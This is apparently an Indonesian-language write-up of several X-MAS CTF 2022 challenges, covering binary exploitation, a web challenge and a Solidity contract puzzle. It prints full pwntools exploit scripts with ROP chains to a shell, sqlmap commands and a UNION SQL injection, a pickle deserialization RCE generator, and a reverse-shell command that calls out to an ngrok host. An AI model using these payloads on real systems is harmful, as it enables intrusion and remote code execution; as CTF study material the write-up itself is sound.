# Binary Exploitation
---
## Santa's Complaint Hotline
Pada challenge ini kita diberikan file attachment berupa executable dan libc nya.
berikut hasil checksec dan decompilasi dari binary tersebut.

![](Pasted%20image%2020221222205054.png)

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *stream; // [rsp+0h] [rbp-810h]
  char v5[1024]; // [rsp+8h] [rbp-808h] BYREF
  char v6[1032]; // [rsp+408h] [rbp-408h] BYREF

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  stream = fopen("/dev/null", "w");
  setbuf(stream, v6);
  puts("Write all the complaints you have about Santa, they will be merrily redirected to /dev/null");
  while ( memcmp(v5, "done", 4uLL) )
  {
    memset(v5, 0, 512uLL);
    fgets(v5, 512, stdin);
    fwrite(v5, 1uLL, 512uLL, stream);
  }
  return 0;
}
```

Dari hasil decompilation di atas kita mengetahui bahwa terdapat buffer overflow pada variable v6 dimana variable v6 di setbuf ke stream. Sehingga saat memasuki while input yang kita masukkan akan masuk ke variable stream dan membuat buffer overflow pada variable v6.

Jadi rencananya kita perlu membuat buffer overflow dengan padding sebanyak length v6 + 8 bit padding - 4 byte string "done" untuk mengontrol return address. Setelah itu kita leak address dari libc, dan melakukan ret2libc untuk mendapatkan shell.
berikut solver yang saya gunakan:

```python
from pwn import *
import sys
from Crypto.Util.number import bytes_to_long

BINARY = "chall_patched"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"

libc = ELF("./libc.so.6", checksec=False)


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def send(self, content):
        p = self.p
        p.sendline(content)


x, p = init()

v6_buff = 1032
pad = 8
done_len = 4
pad = (v6_buff + pad) - 4
pad = b"A"*pad

x.debug((
    # "break *main+143\nc"
    "break *main+287\nc"
))


def leak_puts_got():
    r = ROP(exe)
    r.call(exe.plt['puts'], [exe.got['puts']])
    r.raw(exe.sym['main'])

    pay = pad
    pay += flat(r)
    pay += b"\ndone"
    x.send(pay)
    p.recvuntil(b"/dev/null\n")
    puts_addr = p.recvline()[:-1][::-1]
    return bytes_to_long(puts_addr)


puts_addr = leak_puts_got()
libc.address = puts_addr - libc.sym['puts']
log.info(f"puts @ 0x{puts_addr:x}")
log.info(f"libc @ 0x{libc.address:x}")

r = ROP(libc)
r.raw(r.find_gadget(['ret']))
r.call(libc.sym['system'], [libc.search(b"/bin/sh").__next__()])

pay = pad
pay += flat(r)
pay += b"\ndone"
x.send(pay)

p.interactive()
```

## Naughty List
Kita diberikan attachment berupa file c++.
```c++
#include <cstdlib>
#include <fstream>
#include <iostream>
#include <unordered_map>

#define ELF_MAX_NAGHTY_COUNT 16

std::unordered_map<std::string, std::string> naughty_list{
    {"PinkiePie", "Very naughty"}};

void menu()
{
    std::cout << "1. Ask PinkiePie for the flag" << std::endl;
    std::cout << "2. Query naughty list" << std::endl;
    std::cout << "3. Add to naughty list" << std::endl;
}

void ask_pinkiepie()
{
    bool pinkiepie_naughty = false;
    auto it = naughty_list.begin();

    for (int i = 0; i < ELF_MAX_NAGHTY_COUNT; i++)
    {
        if (it->first == "PinkiePie")
        {
            pinkiepie_naughty = true;
            break;
        }
        ++it;
        if (it == naughty_list.end())
        {
            break;
        }
    }

    if (pinkiepie_naughty)
    {
        std::cout
            << "PinkiePie will not tell you the flag if he is on the naughty list"
            << std::endl;
    }
    else
    {
        std::cout << "PinkiePie is satisfied. Here is your flag!" << std::endl;
        std::ifstream flag_file{"/flag.txt"};

        std::cout << flag_file.rdbuf() << std::endl;
    }
}

bool is_naughty(const std::string &name) { return !(naughty_list[name] == ""); }

void add_to_list(const std::string &name)
{
    if (naughty_list.size() == ELF_MAX_NAGHTY_COUNT)
    {
        std::cout << "Adding this many people requires authorization from Elf "
                     "Resources.";
        return;
    }
    else
    {
        naughty_list.insert({name, "Naughty"});
    }
}

int main()
{
    int choice;

    while (true)
    {
        for (auto &t : naughty_list)
        {
            std::cout << t.first << " : " << t.second << "\n";
        }
        menu();

        std::cin >> choice;

        switch (choice)
        {
        case 1:
        {
            ask_pinkiepie();
        }
        break;
        case 2:
        case 3:
        {
            std::string name;
            std::cout << "Name: ";
            std::cout.flush();
            std::cin >> name;

            if (choice == 2)
            {
                if (is_naughty(name))
                {
                    std::cout << name << " is naughty!" << std::endl;
                }
                else
                {
                    std::cout << name << " is not naughty!" << std::endl;
                }
            }
            else if (choice == 3)
            {
                add_to_list(name);
            }
            else
            {
                std::cout
                    << "Tampering alert triggered. This incident will be reported!"
                    << std::endl;
            }
        }
        break;
        default:
        {
            exit(1);
        }
        }
    }
}
```

Goal dari challenge ini adalah untuk membuat PinkiePie tidak terlist saat memasuki for loop yang ada pada fungsi ask_pinkiepie(), sehingga nanti ketika memasuki if statement dia akan masuk ke else dan mengeprint flagnya. 

Tapi dikarenakan diberikan restriksi pada fungsi add_to_list, kita tidak dapat menambah naughty_list lebih banyak dari ELF_MAX_NAGHTY_COUNT yaitu 16.

```c++
void add_to_list(const std::string &name)
{
    if (naughty_list.size() == ELF_MAX_NAGHTY_COUNT)
...snip...
```

disini kita bisa memanfaatkan is_naughty() untuk menambah naughty_list

```c++
bool is_naughty(const std::string &name) { return !(naughty_list[name] == ""); }
```

jadi fungsi ini somehow membuat key dan value baru saat key yaitu name tidak ada dalam list.

Berikut solver yang saya gunakan:

```python
from pwn import *
import sys

BINARY = "chall"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def send(self, content):
        p = self.p
        p.sendline(content)

    def query(self, name):
        p = self.p
        self.send(b"2")
        p.sendline(name)


x, p = init()

for i in range(50):
    x.query(f"{i}".encode())

p.interactive()
```

![](Pasted%20image%2020221222205402.png)

## Krampus' Greetings
pada attachment kita diberikan source code berupa file C++
```python
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void Setup() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
}

#define SYMBOLS "ABCDEF"

__attribute__((used, hot, noinline))
void Flag() {
  system("/bin/sh");
}

void GenerateGreeting(
  char patternSymbol,
  int patternCount
) {
  char output[2312] = { 0 };
  int outputCursor = 0;
  for (int i = 0; i < patternCount; i += 1) {
    output[outputCursor++] = patternSymbol;
  }
  output[outputCursor++] = '\n';

  printf("enter greeting: \n");
  outputCursor += read(0, &output[outputCursor], 128);

  for (int i = 0; i < patternCount; i += 1) {
    output[outputCursor++] = patternSymbol;
  }
  output[outputCursor++] = '\n';

  printf("%s\n", output);
}

int main() {
  Setup();

  printf("enter pattern character: \n");
  char patternSymbol;
  scanf("%c", &patternSymbol);
  getchar();
  
  printf("enter number of symbols: \n");
  char numberString[512];
  int readAmount = read(0, numberString, sizeof(numberString) - 1);
  numberString[readAmount] = '\0';

  int mappings[sizeof(SYMBOLS)] = { 0 };
  for (int i = 0; i < readAmount; i += 1) {
    char current = numberString[i];
    int index = 0;
    for (const auto symbol: SYMBOLS) {
      if (current == symbol) {
        mappings[index] += 1;
      }
      index += 1;
    }
  }

  int patternCount = 0;
  int power = 1;
  for (int i = 0; i < sizeof(SYMBOLS); ++i) {
    if (mappings[i] > 3) {
      abort();
    }
    patternCount += power * mappings[i];
    power *= 3;
  }

  GenerateGreeting(patternSymbol, patternCount);
}
```

ada juga attachment berupa binary dari code diatas, kita lakukan checksec maka akan muncul seperti dibawah ini: 

![](Pasted%20image%2020221222210316.png)

![](Pasted%20image%2020221222210324.png)

Jadi pada variable paternSymbol kita bisa menginputkan null byte dimana ini akan berpengaruh pada variable patternCount sehingga bisa membuat value dari variable ini menjadi lebih besar dari yang seharusnya.

Berikut solver dari challenge tersebut:

```python
from pwn import *
import sys

BINARY = "main_patched"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"

def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def send(self, content):
        p = self.p
        p.send(content)


x, p = init()

x.debug((
    "break *_Z16GenerateGreetingci+288\nc\n"
    "break *system\nc\n"
))


def exploit(r: ROP):
    p.sendlineafter(b"character: \n", b"A")
    p.sendlineafter(b"symbols: \n", b"ABCCDDE\0\0\0")
    sleep(1)

    pay = b"AA\0\0\0\0"+cyclic(8)
    pay += flat(r)
    p.sendafter(b"greeting: \n", pay)
    print(p.recv(10000))

r = ROP(exe)
r.raw(r.find_gadget(['ret']))
r.call('_Z4Flagv')
exploit(r)

p.interactive()
```

# Web Exploitation
---
## Elf Resources
### Vulnerability
- Blind SQL injection (sqlite)
- Python pickle deserialization to rce 
### Recon
Pada challenge kita diberikan url http://challs.htsp.ro:13001/. Dari url tersebut kita menemukan beberapa path yaitu:
- http://challs.htsp.ro:13001/1
- http://challs.htsp.ro:13001/2
- http://challs.htsp.ro:13001/3
Setelah itu kita mencoba untuk mem-fuzzing url tersebut menggunakan FFUF.

```sh
ffuf -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://challs.htsp.ro:13001/FUZZ -fs 265
```

![](Pasted%20image%2020221222205507.png)

Setelah prosess fuzzing kita menemukan beberapa path baru, dimana path baru ini sangat mirip dengan sql query dengan where clause, misal: 

```sql
SELECT * FROM dimas WHERE id=1;
or
SELECT data FROM maulana WHERE id=true;
```

Sehingga dari sini bisa kita asumsikan bahwa path dalam url ini menggunakan SQL query untuk mendapatkan suatu data dari sebuah database.

#### Mememukan Data Menggunakan SQLmap
Dari sini kita coba untuk menggunakan sqlmap untuk medapatkan data dari database tersebut.

```sh
sqlmap -u "http://challs.htsp.ro:13001/1*" --table
```

output:

```
...snip...
[19:48:29] [INFO] resuming back-end DBMS 'sqlite' 
...snip...
<current>
[2 tables]
+-----------------+
| elves           |
| sqlite_sequence |
+-----------------+
...snip...
```

```sh
sqlmap -u "http://challs.htsp.ro:13001/1*" -T elves --column
```

output:

```
...snip...
Database: <current>
Table: elves
[2 columns]
+--------+---------+
| Column | Type    |
+--------+---------+
| data   | text    |
| id     | integer |
+--------+---------+
...snip...
```

```sh
sqlmap -u "http://challs.htsp.ro:13001/1*" -T elves -C data --dump --thread 10 --hex
```

output: 

![](Pasted%20image%2020221222205718.png)

Dari hasil sqlmap tersebut kita ketahui bahwa server menggunakan database sqlite. Dalam database ini terdapat table elves dimana didalamnya ada colom data yang berisi base64.

Setelah itu kita menganalisa base64 tersebut dengan command dibawah ini:

```sh
echo "gASVUAAAAAAAAACMCF9fbWFpbl9flIwDRWxmlJOUKYGUfZQojARuYW1llIwJU25vd2ZsYWtllIwIYWN0aXZpdHmUjA1QYWNraW5nIGdpZnRzlIwCaWSUTnViLg==" | base64 -d | hexdump -C
```

output:

```
00000000  80 04 95 50 00 00 00 00  00 00 00 8c 08 5f 5f 6d  |...P.........__m|
00000010  61 69 6e 5f 5f 94 8c 03  45 6c 66 94 93 94 29 81  |ain__...Elf...).|
00000020  94 7d 94 28 8c 04 6e 61  6d 65 94 8c 09 53 6e 6f  |.}.(..name...Sno|
00000030  77 66 6c 61 6b 65 94 8c  08 61 63 74 69 76 69 74  |wflake...activit|
00000040  79 94 8c 0d 50 61 63 6b  69 6e 67 20 67 69 66 74  |y...Packing gift|
00000050  73 94 8c 02 69 64 94 4e  75 62 2e                 |s...id.Nub.|
0000005b
```

Dari situ kita tau bahwa data tersebut memiliki header 80 04. Melihat dari reverensi berikut: 

![](Pasted%20image%2020221222205819.png)

sumber: https://www.mandiant.com/resources/blog/hunting-deserialization-exploits

Header 80 04 merupakah header pickle (python serialization/deserialization referensi: https://docs.python.org/3/library/pickle.html)

#### Deserialize Pickle
Dari sini kita mencoba untuk mendeserialisasi data pickle tadi menjadi python object menggunakan script berikut: 

```python
import pickle
from base64 import b64decode

class Elf:...
a = pickle.loads(b64decode("gASVUAAAAAAAAACMCF9fbWFpbl9flIwDRWxmlJOUKYGUfZQojARuYW1llIwJU25vd2ZsYWtllIwIYWN0aXZpdHmUjA1QYWNraW5nIGdpZnRzlIwCaWSUTnViLg=="))
print(a.__dict__)
```

output:

```
{'name': 'Snowflake', 'activity': 'Packing gifts', 'id': None}
```

Output yang kita dapatkan beruka dictionary yang berisi nama, activity, dan id. Ini sama persis dengan data yang ditampilkan pada path http://challs.htsp.ro:13001/1.

Sehingga bisa kita asumsikan bahwa data pickle tersebut digunakan untuk menghasilkan text pada page tersebut. Sekarang kita akan ke bagian exploitasi, dimana kita akan mengeksploitasi pickle ini dan mendapatkan RCE. 

![[Pasted image 20221222205926.png]]

### Eksploitasi 

Untuk mengeksplotasi pickle pada machine ini, kita bisa menggunakan UNION pada sql. Menggunakan UNION kita bisa mengubah data yang akan menjadi input pada page dan juga mengeksekusi malcious pickle objek.

Untuk menggenerate pickle objek saya menggunakan script berikut:

```python
import pickle
import base64
import sys

COMMAND = sys.argv[1]
class RCE:
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))
print(base64.b64encode(pickle.dumps({'name': RCE(), 'activity': 'pwned', 'id': None})).decode())
```

Script tersebut akan menggenerate python object yang dimana didalamnya terdapat objek __reduce__() objek reduce ini akan digunakan oleh pickle untuk mengkonstruksi sebuah class, sehingga saat waktu konstruksi itu "Deserialization" python akan mengesekusi fungsi os.system dari sinilah kita bisa mendapatkan rce. 

Sekarang kita akan mencoba membuat revshell menggunakan script di atas.

```
⋊> ~/D/M/D/W/x/w/Elf Resources on main ⨯ python3 pickle_rce.py "bash -c '/bin/sh -i >& /dev/tcp/2.tcp.ngrok.io/12037 0>&1'"
gASVeQAAAAAAAAB9lCiMBG5hbWWUjAVwb3NpeJSMBnN5c3RlbZSTlIw6YmFzaCAtYyAnL2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8yLnRjcC5uZ3Jvay5pby8xMjAzNyAwPiYxJ5SFlFKUjAhhY3Rpdml0eZSMBXB3bmVklIwCaWSUTnUu
```

Kita masukkan payload tersebut ke URL dan tidak lupa kita url-encoded

```
"0" UNION SELECT "gASVeQAAAAAAAAB9lCiMBG5hbWWUjAVwb3NpeJSMBnN5c3RlbZSTlIw6YmFzaCAtYyAnL2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8yLnRjcC5uZ3Jvay5pby8xMjAzNyAwPiYxJ5SFlFKUjAhhY3Rpdml0eZSMBXB3bmVklIwCaWSUTnUu"
```

```
http://challs.htsp.ro:13001/%220%22%20UNION%20SELECT%20%22gASVeQAAAAAAAAB9lCiMBG5hbWWUjAVwb3NpeJSMBnN5c3RlbZSTlIw6YmFzaCAtYyAnL2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8yLnRjcC5uZ3Jvay5pby8xMjAzNyAwPiYxJ5SFlFKUjAhhY3Rpdml0eZSMBXB3bmVklIwCaWSUTnUu%22
```

![](Pasted%20image%2020221222210046.png)

yay kita mendapatkan RCE!

Ada pula cara lain yang dapat kita gunakan untuk mendapatkan RCE tanpa perlu revershell yaitu dengan menggunakan exec dan after_this_request pada package flask . Dengan menggunakan exec kita bisa mengeksekusi decorator @after_this_request sehingga kita bisa mengontrol response yang akan diberikan server. Kita sedikit merubah payload di atas agar bisa menggunakan exec

```python
import pickle
import base64
import sys

COMMAND = f"""
from flask import current_app, after_this_request
@after_this_request
def hook(*args, **kwargs):
    from flask import make_response
    from subprocess import check_output
    r = make_response(check_output("{sys.argv[1]}", shell=True))
    return r
"""
class RCE:
    def __reduce__(self):
        return (exec,(COMMAND,))
print(base64.b64encode(pickle.dumps({'name': RCE(), 'activity': 'pwned', 'id': None})).decode())
```

Dari situ kita akan mencoba mengeksekusi ls / di server. Pertama kita akan membuat payloadnya terlebih dahulu. 

![[Pasted image 20221222210140.png]]

kita masukkan ke url

http://challs.htsp.ro:13001/0%20UNION%20SELECT%20%22gASVMwEAAAAAAAB9lCiMBG5hbWWUjAhidWlsdGluc5SMBGV4ZWOUk5SM8wpmcm9tIGZsYXNrIGltcG9ydCBjdXJyZW50X2FwcCwgYWZ0ZXJfdGhpc19yZXF1ZXN0CkBhZnRlcl90aGlzX3JlcXVlc3QKZGVmIGhvb2soKmFyZ3MsICoqa3dhcmdzKToKICAgIGZyb20gZmxhc2sgaW1wb3J0IG1ha2VfcmVzcG9uc2UKICAgIGZyb20gc3VicHJvY2VzcyBpbXBvcnQgY2hlY2tfb3V0cHV0CiAgICByID0gbWFrZV9yZXNwb25zZShjaGVja19vdXRwdXQoImxzIC8iLCBzaGVsbD1UcnVlKSkKICAgIHJldHVybiByCpSFlFKUjAhhY3Rpdml0eZSMBXB3bmVklIwCaWSUTnUu%22

maka kita akan mendapatkan list directory /

![](Pasted%20image%2020221222210201.png)

# Blockchain
---
## Blocker

### Recon
Pada challenge kita diberikan attachment berupa file source solidity sebagai berikut: 

```sol
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.17;

contract Blocker {

    bool public solved = false;
    uint256 public current_timestamp;

    function _getPreviousTimestamp() internal returns (uint256) {  
        current_timestamp = block.timestamp;
        return block.timestamp;
    }
    
    function solve(uint256 _guess) public {
        require(_guess == _getPreviousTimestamp());
        solved = true;
    }
}
```

Kita diberikan juga netcat untuk mendeploy smartcontract dari challenge tersebut.

![](Pasted%20image%2020221223211635.png)

Karna salah satu probset dari X mas ctf memberi tahu bahwa challenge yang di deploy sedikit berbeda dengan attachment yang kita dapat, saya mencoba untuk mendapatkan bytecode dari challenge dengan script berikut:

```python
from web3 import Web3
from web3 import HTTPProvider
from web3.contract import Contract
from pwn import context, log

context.log_level = "INFO"

rpc_url = "http://challs.htsp.ro:9001/a0e14274-81f8-4cae-bead-175729da2c0e"
privkey = "0x14d80fc639ecb220629a21352a6b9f89c5143579dfe3ea759be6c20116496eda"
current_contract_addr = "0xDa8c3Cb4407DfEb08cC0Fe60661f1d89A81599d6"

w3 = Web3(HTTPProvider(rpc_url))
current_contract: Contract = w3.eth.contract(current_contract_addr)
log.info("current bytecode: %s", w3.eth.getCode(current_contract_addr).hex())
```

Setelah menjalankan perintah diatas kita mendapatkan bytecode dari contract kita sekarang

![](Pasted%20image%2020221223211710.png)

```
0x608060405234801561001057600080fd5b50600436106100365760003560e01c806364d98f6e1461003b578063be0ba8d214610058575b600080fd5b610043610083565b60405190151581526020015b60405180910390f35b60005461006b906001600160a01b031681565b6040516001600160a01b03909116815260200161004f565b60008060009054906101000a90046001600160a01b03166001600160a01b031663799320bb6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100d7573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100fb9190610100565b905090565b60006020828403121561011257600080fd5b8151801515811461012257600080fd5b939250505056fea264697066735822122080dc49e5806f8d3590ff266a78a4c62f713c9f01ca443509d2af8967e9a2a1df64736f6c63430008110033
```

Setelah kita decompile bytecode tersebut menggunakan https://ethervm.io/decompile, ternyata benar bahwa current contract yang kita dapatkan bukan cotract yang sekarang kita akses. Hal ini bisa kita lihat dari fungsi isSolved() dimana fungsi ini tidak ada di source code contract yang kita dapatkan. 

![](Pasted%20image%2020221223211742.png)

Karna hasil decompile yang kita dapatkan masih belum mudah untuk dipahami, saya mencoba untuk menggunakan decompiler lain yaitu https://github.com/eveem-org/panoramix.

Setelah kita decompile menggunakan panoramix, kita mendapatkan hasil seperti ini. 

![](Pasted%20image%2020221223211801.png)

disini kita bisa melihat sesuatu yang menarik yaitu pada def storage.

```sol
...snip...
def storage:
  unknownbe0ba8d2Address is addr at storage 0
...snip...
```

Dari situ kita mencoba untuk meleak storage 0 menggunakan script berikut

```python
from web3 import Web3
from web3 import HTTPProvider
from web3.contract import Contract
from pwn import context, log

context.log_level = "INFO"

rpc_url = "http://challs.htsp.ro:9001/1bf5429c-05c0-41db-a719-6f076b94c995"
privkey = "0x69e63e1a8c0a3b829d43aeb88a8624d9a8f89f50035626405f77b065d3629332"
current_contract_addr = "0xB7bFCbb34209005F0A2E322371301beAB5D34BfE"

w3 = Web3(HTTPProvider(rpc_url))

leak = w3.eth.getStorageAt(current_contract_addr, 0).hex()
log.info("leak addr: %s", leak)
vuln_contract_addr = w3.toChecksumAddress("0x"+leak[-40:])
log.info("vuln contract address @ %s", vuln_contract_addr)
log.info("vuln contract bytecode: %s", w3.eth.getCode(vuln_contract_addr).hex())
```

output:

```
[*] leak addr: 0x00000000000000000000000098d8380bd57a37b95cbe29a536c5fec5e114c846
[*] vuln contract address @ 0x98d8380bD57a37b95CBe29a536c5FeC5e114C846
[*] vuln contract bytecode: 0x6080604052348015600f57600080fd5b5060043610603c5760003560e01c8063799320bb1460415780639aa643fd146062578063b8b8d35a146077575b600080fd5b600054604d9060ff1681565b60405190151581526020015b60405180910390f35b606a60015481565b6040519081526020016059565b6086608236600460a8565b6088565b005b4260018190558114609857600080fd5b506000805460ff19166001179055565b60006020828403121560b957600080fd5b503591905056fea2646970667358221220708571f97534312e09740006fa02f614ce48c121c0c7f2cff379dd669295089864736f6c63430008110033
```

kita decompile lagi bytecode tersebut menggunakan panoramix, maka kita akan mendapatkan hasil seperti berikut:

```sol
def storage:
  unknown799320bb is uint8 at storage 0
  unknown9aa643fd is uint256 at storage 1

def unknown799320bb() payable: 
  return bool(unknown799320bb)

def unknown9aa643fd() payable: 
  return unknown9aa643fd

#
#  Regular functions
#

def _fallback() payable: # default function
  revert

def unknownb8b8d35a(uint256 _param1) payable: 
  require calldata.size - 4 >=′ 32
  unknown9aa643fd = block.timestamp
  require _param1 == block.timestamp
  unknown799320bb = 1
```

disini kita melihat beberapa unknown function, untuk melihat nama fungsi asli dari unknown+signature ini kita bisa menggunakan website berikut untuk mencari signature dan mendapatkan nama asli fungsi tersebut https://www.4byte.directory/signatures/.

Setelah kita cari hashnya satu persatu, kita mendapatkan nama fungsi sebagai berikut:

```
799320bb solved()    
9aa643fd current_timestamp()
b8b8d35a solve(uint256)    
```

Semisal kita tidak mendapatkan hasil dari pencarian signature, kita bisa mencoba cara bruteforce signature menggunakan apllikasi sig-bruteforcer https://github.com/Decurity/abi-decompiler

Kembali ke topik, karena nama-nama fungsi yang terdapat di contract yang baru kita temukan sama dengan kontrak dari attachment, kita bisa menyimpulkan bahwa contract ini sama. 

### Eksplotasi

Untuk mengeksploitasi smartcontract ini kita perlu melihat kembali ke source code attachment:

```sol
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.17;

contract Blocker {

    bool public solved = false;
    uint256 public current_timestamp;

    function _getPreviousTimestamp() internal returns (uint256) {  
        current_timestamp = block.timestamp;
        return block.timestamp;
    }
    
    function solve(uint256 _guess) public {
        require(_guess == _getPreviousTimestamp());
        solved = true;
    }
}
```

Jadi dalam smartcontract ini kita perlu mengecall fungsi solve(uint256 _guess) untuk mengeset variable solved menjadi true.

Tetapi di argument pada fungsi solve, kita perlu memasukkan timestamp dari block ini agar kita dapat mengesetnya.

Jadi rencananya kita akan membuat transaksi ke salah satu fungsi sehingga nanti kita bisa mendapatkan timestampnya menggunakan getBlock("latest"). dari timestamp tersebut akan kita masukkan menjadi argument untuk fungsi solve() sehingga nati variable solved akan ter-set menjadi true.

Tapi perlu dicatat, karena adanya delay antara server dan client kita perlu mengeset delay secara manual dan kita juga perlu membuat transaksi beberpakali sampai timestamp benar. 

berikut solver yang saya gunakan untuk mengesolve challenge ini:

```python
from web3 import Web3
from web3 import HTTPProvider
from solcx import compile_source
from web3.contract import Contract
from pwn import context, log

context.log_level = "INFO"

compile_blocker = compile_source(
    '''
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.16;

contract Blocker {

    bool public solved = false;
    uint256 public current_timestamp;

    function _getPreviousTimestamp() internal returns (uint256) {}
    
    function solve(uint256 _guess) public {}
}
    ''',
    output_values=['abi']
)

abi = compile_blocker.popitem()[1]['abi']

log.info("ABI:\n%s", abi)


rpc_url = "http://challs.htsp.ro:9001/1bf5429c-05c0-41db-a719-6f076b94c995"
privkey = "0x69e63e1a8c0a3b829d43aeb88a8624d9a8f89f50035626405f77b065d3629332"
current_contract_addr = "0xB7bFCbb34209005F0A2E322371301beAB5D34BfE"

w3 = Web3(HTTPProvider(rpc_url))
w3.eth.default_account = w3.eth.account.privateKeyToAccount(privkey).address
leak = w3.eth.getStorageAt(current_contract_addr, 0).hex()
log.info("leak addr: %s", leak)
vuln_contract_addr = w3.toChecksumAddress("0x"+leak[-40:])
log.info("vuln addr: %s", vuln_contract_addr)
vuln_contract: Contract = w3.eth.contract(vuln_contract_addr, abi=abi)

gas_price = w3.eth.gasPrice
gas_limit = 1000000

server_delay = 3

while True:
    block = w3.eth.getBlock("latest")
    block_before = block.number
    timestamp_before = block.timestamp+server_delay
    log.info("before block: %s", block_before)
    log.info("before timestamp: %s", timestamp_before)
    tx_hash =  vuln_contract.functions.solve(timestamp_before).transact({"gasPrice": gas_price, "gas": gas_limit})
    block = w3.eth.getBlock("latest")
    block_after = block.number
    timestamp_after = block.timestamp
    log.info("after block: %s", block_after)
    log.info("after timestamp: %s", timestamp_after)

    diff = timestamp_after - timestamp_before
    log.info("timestamp diff: %s", diff)

    isSolve = vuln_contract.functions.solved().call()
    log.info("solved: %s", isSolve)

    if isSolve:
        break
```

![](Pasted%20image%2020221223212147.png)

![](Pasted%20image%2020221223212155.png)

referensi:
- https://www.sudeepvision.com/2022/12/x-mas-ctf-2022-blocker-challenge-write.html
- channel official x-mas-ctf-2022